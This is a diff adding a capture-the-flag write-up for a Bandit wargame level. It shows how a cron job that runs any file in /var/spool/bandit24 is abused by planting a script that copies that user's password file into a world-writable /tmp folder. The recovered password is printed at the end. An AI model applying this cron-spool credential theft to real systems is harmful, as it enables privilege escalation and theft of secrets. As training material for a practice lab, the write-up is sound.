@@ -229,3 +229,124 @@ jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 * I recieve the password for the next level.
 
+---
+
+### Bandit23 -> Level24
+
+* Task
+
+A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.
+
+* I first looked inside the /etc/cron.d/ directory to see the cronjob that is running for bandit24.
+
+```
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ ls -la
+total 28
+drwxr-xr-x   2 root root 4096 Dec 28 14:34 .
+drwxr-xr-x 100 root root 4096 Mar 12 09:51 ..
+-rw-r--r--   1 root root  102 Apr  5  2016 .placeholder
+-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit22
+-rw-r--r--   1 root root  122 Dec 28 14:34 cronjob_bandit23
+-rw-r--r--   1 root root  120 Dec 28 14:34 cronjob_bandit24
+-rw-r--r--   1 root root  190 Oct 31  2017 popularity-contest
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+```
+
+* Just like the previous level there is a shell script that is running every minute in /usr/bin/cronjob_bandit24.sh directory.
+* I cat the file in this directory to see the shell script.
+
+```
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+```
+
+* From this bash script we can see that the following occurs;
+
+1. The user is placed a variable called myname.
+2. Change directory to /var/spool/$myname.
+3. Display a message ,executing and deleting all scripts in the /var/spool/$myname.
+4. Loop through all files in the current directory.
+	4.1. Check if the file in not equal to . file or the previous directory.
+		4.1.1. Then display message handling filename.
+		4.1.2. execute all files in the directory with timeout after 1 minute kill all files with SIGKILL signal.
+		4.1.3. remove all files in this directory.
+	4.2. end if statement.
+5. End script.
+
+* What we can do here is create a directory that is writeable by all users.
+* Then inside of this directory create a bash script which copies the password from /etc/bandit_pass/bandit24 into a file.
+* We make the bash script executable by all users.
+* Then copy this bash script inside the /var/spool/bandit24 directory, where it will be run by the bandit24 user.
+* Which we will recieve the password when the cronjob is executed.
+
+1. Create the directory.
+
+```
+bandit23@bandit:/etc/cron.d$ mkdir -p /tmp/bandit-password/
+```
+
+2. Make the directory writeable to all users.
+
+```
+bandit23@bandit:/etc/cron.d$ chmod 777 /tmp/bandit-password/
+```
+
+3. Create a bash script inside this directory which copies the password from /etc/bandit_pass/bandit24 to a file in this directory.
+
+```
+bandit23@bandit:/tmp/bandit-password$ touch bandit24pass.sh
+bandit23@bandit:/tmp/bandit-password$ vim bandit24pass.sh 
+```
+
+```
+#!/bin/bash
+
+#cat the file of bandit24 password to new file in this directory.
+
+cat /etc/bandit_pass/bandit24 > /tmp/bandit-password/bandit24-pass
+```
+
+4. Makes the file executable by all users.
+
+```
+bandit23@bandit:/tmp/bandit-password$ chmod 777 bandit24pass.sh 
+```
+
+5. Now copy the bash script to the /var/spool/bandit24 where it will be executed by bandit24 user.
+
+```
+bandit23@bandit:/tmp/bandit-password$ cp bandit24pass.sh /var/spool/bandit24/
+```
+
+6. Now we wait till the cronjob is excuted again so we can recieve our password.
+
+```
+bandit23@bandit:/tmp/bandit-password$ ls
+bandit24-pass  bandit24pass.sh
+```
+
+7. Bash script has been executed and we receive our password.
+
+```
+bandit23@bandit:/tmp/bandit-password$ cat bandit24-pass 
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
+
+
